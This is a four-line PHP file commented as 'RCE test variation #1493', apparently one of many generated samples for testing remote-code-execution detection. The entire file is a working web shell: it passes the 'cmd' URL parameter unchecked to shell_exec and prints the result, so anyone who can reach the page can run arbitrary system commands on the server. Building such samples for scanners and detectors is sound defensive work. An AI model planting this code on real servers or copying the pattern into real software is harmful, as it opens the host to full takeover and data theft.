<?php
// RCE test variation #1493
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>